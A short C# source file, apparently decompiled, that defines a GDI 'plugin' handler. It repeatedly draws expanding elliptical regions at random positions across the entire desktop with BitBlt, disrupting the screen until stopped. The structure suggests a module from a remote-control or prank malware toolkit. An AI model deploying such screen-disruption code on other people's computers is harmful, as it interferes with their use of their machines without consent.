using System;
using System.Threading;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleWef
{
	public static CancellationTokenSource ctsStop;

	public static void ci(int x, int y, int w, int h)
	{
		IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
		IntPtr intPtr = NativeMethods.CreateEllipticRgn(x, y, w + x, h + y);
		NativeMethods.SelectClipRgn(dC, intPtr);
		NativeMethods.BitBlt(dC, x, y, w, h, dC, x, y, 2229030u);
		NativeMethods.DeleteObject(intPtr);
		NativeMethods.ReleaseDC(IntPtr.Zero, dC);
	}

	public static void Start()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			return;
		}
		ctsStop = new CancellationTokenSource();
		NativeMethods.GetWindowRect(NativeMethods.GetDesktopWindow(), out var lpRect);
		int num = lpRect.right - lpRect.left - 500;
		int num2 = lpRect.bottom - lpRect.top - 500;
		int num3 = 0;
		while (!ctsStop.IsCancellationRequested)
		{
			int num4 = (int)(new Random().NextDouble() * (double)(num + 1000) - 500.0);
			int num5 = (int)(new Random().NextDouble() * (double)(num2 + 1000) - 500.0);
			for (int i = 0; i < 1000; i += 100)
			{
				ci(num4 - i / 2, num5 - i / 2, i, i);
				Thread.Sleep(25);
			}
			num3++;
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
